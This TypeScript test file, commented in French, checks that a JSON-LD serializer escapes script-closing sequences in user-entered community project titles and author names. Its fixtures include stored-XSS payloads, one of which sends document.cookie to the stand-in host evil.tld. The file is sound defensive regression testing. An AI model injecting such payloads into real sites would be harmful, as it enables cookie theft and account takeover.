import { serializeJsonLd } from '../json-ld';
import { buildCommunityProjectJsonLd } from '../community-seo';
import type { CommunityProjectDetail } from '../community-types';

/**
 * Non-régression de l'injection de script stockée sur `/community/[id]`.
 *
 * Le titre d'un projet communautaire est saisi par un utilisateur, validé par
 * `@IsString() @MaxLength(255)` — donc sans restriction de caractères — puis
 * placé dans le `headline` d'un bloc JSON-LD rendu via
 * `dangerouslySetInnerHTML`. `JSON.stringify` seul laisse passer `</script>`.
 */
describe('serializeJsonLd', () => {
  it("ne laisse subsister aucune séquence capable de fermer le bloc <script>", () => {
    const payload = {
      headline: 'Salon refait</script><script>alert(document.cookie)</script>',
    };

    const serialized = serializeJsonLd(payload);

    expect(serialized).not.toContain('</script');
    expect(serialized).not.toContain('<');
    expect(serialized).not.toContain('>');
    expect(serialized).toContain('\\u003c');
  });

  it('reste du JSON strictement équivalent une fois analysé', () => {
    const payload = {
      headline: 'Cuisine <2m² & "moderne"',
      nested: { list: ['a>b', 'c&d'] },
    };

    expect(JSON.parse(serializeJsonLd(payload))).toEqual(payload);
  });

  it('échappe U+2028/U+2029, terminateurs de ligne pour un analyseur JS', () => {
    const LS = String.fromCharCode(0x2028);
    const PS = String.fromCharCode(0x2029);
    const value = `a${LS}b${PS}c`;

    const serialized = serializeJsonLd({ t: value });

    expect(serialized).not.toContain(LS);
    expect(serialized).not.toContain(PS);
    expect(JSON.parse(serialized)).toEqual({ t: value });
  });

  it('échappe & sans altérer la valeur analysée', () => {
    const serialized = serializeJsonLd({ t: 'Leroy & Merlin' });

    expect(serialized).not.toContain('&');
    expect(serialized).toContain('\\u0026');
    expect(JSON.parse(serialized)).toEqual({ t: 'Leroy & Merlin' });
  });
});

describe('buildCommunityProjectJsonLd + serializeJsonLd', () => {
  const project = {
    id: 'p1',
    title: 'Salon</script><script>fetch("//evil.tld?c="+document.cookie)</script>',
    user_display_name: 'Bob</script><script>0</script>',
    work_type: 'painting',
    length_cm: 400,
    width_cm: 300,
    height_cm: 250,
    total_cost_cents: 123400,
    duration_days: 4,
    published_at: '2026-07-01T00:00:00.000Z',
    before_photo_ids: [],
    after_photo_ids: [],
  } as unknown as CommunityProjectDetail;

  it('neutralise le titre et le nom d’auteur dans le bloc rendu', () => {
    const html = serializeJsonLd(
      buildCommunityProjectJsonLd(project, 'https://chiffreo.fr/community/p1'),
    );

    expect(html).not.toContain('</script');
    expect(html).not.toContain('<script');
    // Le contenu reste intégralement lisible par un moteur de recherche.
    expect(JSON.parse(html).headline).toBe(project.title);
  });
});
